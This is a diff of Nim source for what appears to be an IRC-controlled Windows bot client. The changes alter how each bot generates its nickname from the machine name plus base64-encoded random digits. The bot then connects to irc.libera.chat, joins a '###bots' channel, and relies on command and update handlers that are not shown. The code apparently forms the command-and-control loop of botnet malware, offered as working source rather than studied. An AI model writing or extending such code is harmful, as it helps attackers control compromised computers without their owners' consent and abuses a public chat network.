@@ -1,4 +1,4 @@
-import irc, asyncdispatch, winim, random, strutils, threadpool
+import irc, asyncdispatch, winim, random, strutils, threadpool, base64
 
 import command_handler, update_handler
 
@@ -25,7 +25,13 @@ proc generateName():string =
           name &= cast[char](name_buffer[i])
       else:
           break
-  return name
+
+  randomize()
+  var
+    randInt1 = rand(1000000..9999999)
+    randInt2 = rand(1000000..9999999)
+
+  return name & encode($randInt1) & encode($randInt2)
 
 
 
@@ -50,13 +56,11 @@ while true:
 
   var name = generateName()
 
-  if g_dbg: echo "ComputerName: ", name
+  if g_dbg: echo "Generated Name: ", name
 
   ## The final nickname must be 16 chars long so the rest will be filled with random digits
-  randomize()
-  var 
-    randInt1 = rand(1000000..9999999)
-    randInt2 = rand(1000000..9999999)
+
+  var
     target_channel:string = "###bots"
 
 
@@ -84,7 +88,7 @@ while true:
     except OSError as e:
       echo "onIrcEvent exception: [", repr(e), "]"
   try:
-    var  client = newAsyncIrc("irc.libera.chat", nick=name & $randInt1 & $randInt2, joinChans = @[target_channel], realname = "Zanza", user="Zanza", callback = onIrcEvent)
+    var  client = newAsyncIrc("irc.libera.chat", nick=name , joinChans = @[target_channel], realname = "Zanza", user="Zanza", callback = onIrcEvent)
 
     try:
       asyncCheck client.run()
